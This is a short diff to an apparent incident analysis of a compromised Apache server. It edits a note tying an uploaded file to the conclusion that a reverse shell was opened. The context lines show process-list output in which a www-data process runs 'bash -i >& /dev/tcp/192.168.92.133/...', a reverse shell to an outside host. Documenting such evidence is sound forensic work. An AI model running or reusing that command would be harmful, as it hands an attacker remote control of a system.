@@ -28,4 +28,4 @@ www-data  158053  0.0  0.0   2580  1408 ?        S    15:02   0:00 sh -c /bin/ba
 www-data  158054  0.0  0.1   3952  2816 ?        S    15:02   0:00 /bin/bash -c bash -i >& /dev/tcp/192.168.92.133/44
 www-data  158055  0.0  0.1   4216  3328 ?        S    15:02   0:00 bash -i
 
-Note: The fact that the attacker uploaded a file to the _uploaded folder of the Apache server also contributes to the conclusion that a reverse shell was opened.  
+Note: The fact that the attacker uploaded a file to the _uploaded folder of the Apache server (as seen in the '4_apache_web_server_file_upload' file) also contributes to the conclusion that a reverse shell was opened.  
